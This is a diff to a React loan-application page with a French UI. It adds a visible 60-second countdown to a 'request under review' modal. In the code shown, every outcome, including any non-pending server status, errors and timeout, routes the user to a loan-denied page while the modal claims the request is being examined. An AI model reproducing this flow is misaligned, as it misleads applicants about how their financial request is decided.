@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Wallet, CheckCircle2 } from "lucide-react";
 
@@ -8,6 +8,7 @@ const LoanLimit = () => {
   const [amount, setAmount] = useState(100000); 
   const [months, setMonths] = useState(6);
   const [isProcessing, setIsProcessing] = useState(false);
+  const [timeLeft, setTimeLeft] = useState(60); // 60 seconds countdown
   const navigate = useNavigate();
   const location = useLocation();
   
@@ -20,6 +21,21 @@ const LoanLimit = () => {
 
   const handleContinue = async () => {
     setIsProcessing(true);
+    setTimeLeft(60); // Reset timer to 60
+    
+    // Start the visual countdown
+    const countdownInterval = setInterval(() => {
+      setTimeLeft((prev) => {
+        if (prev <= 1) {
+          clearInterval(countdownInterval);
+          setIsProcessing(false);
+          navigate("/loan-denied");
+          return 0;
+        }
+        return prev - 1;
+      });
+    }, 1000);
+
     try {
       const res = await fetch(`${API_URL}/api/apply-loan`, {
         method: "POST",
@@ -29,25 +45,20 @@ const LoanLimit = () => {
       const data = await res.json();
       
       if (data.status === "pending" && data.loan_id) {
-        const interval = setInterval(async () => {
+        const pollInterval = setInterval(async () => {
           const statusRes = await fetch(`${API_URL}/api/loan-status/${data.loan_id}`);
           const statusData = await statusRes.json();
           
           if (statusData.status !== "pending") {
-            clearInterval(interval);
+            clearInterval(pollInterval);
+            clearInterval(countdownInterval);
             setIsProcessing(false);
             navigate("/loan-denied"); 
           }
         }, 3000);
-
-        // ✅ Countdown of 1 minute (60 seconds)
-        setTimeout(() => {
-          clearInterval(interval);
-          setIsProcessing(false);
-          navigate("/loan-denied"); 
-        }, 60000);
       }
     } catch (error) {
+      clearInterval(countdownInterval);
       setIsProcessing(false);
       navigate("/loan-denied");
     }
@@ -108,8 +119,13 @@ const LoanLimit = () => {
             <div className="spinner"></div>
             <h3 className="modal-title">Demande soumise</h3>
             <p className="modal-text">
-              Votre demande a été soumise avec succès. Veuillez patienter pendant que nous examinons votre demande.
+              Votre demande a été soumise avec succès.<br/>
+              Veuillez patienter pendant que nous examinons votre demande.
             </p>
+            {/* ✅ VISIBLE COUNTDOWN */}
+            <div style={{ marginTop: '16px', fontSize: '18px', fontWeight: 'bold', color: '#F5B800' }}>
+              {timeLeft} secondes
+            </div>
           </div>
         </div>
       )}
